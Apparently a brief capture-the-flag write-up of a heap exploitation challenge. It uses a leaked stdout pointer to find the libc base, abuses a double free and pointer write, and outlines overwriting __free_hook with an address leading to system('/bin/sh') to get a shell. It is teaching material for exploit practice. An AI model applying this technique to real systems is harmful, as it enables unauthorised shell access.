**Read source code**
- `printf("stdout: %p\n", stdout);`: calculate `libc_base`
- `scanf("%ld", &size);`: input size of malloc
- `*(long *)*ptr = *(ptr+1);`: ptr point to ptr + 1
- double `free(ptr);` : cause error => bypass free
- `Checksec` in gdb
```
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
Stripped:   No
```
- So the idea is that put addr of `system("/bin/sh")` into Freehook
---  
***EPLOIT***
```
Size: a number
Data: free_hook(addr) + 0x0000000000400a11 (addr before system("/bin/sh"))
```
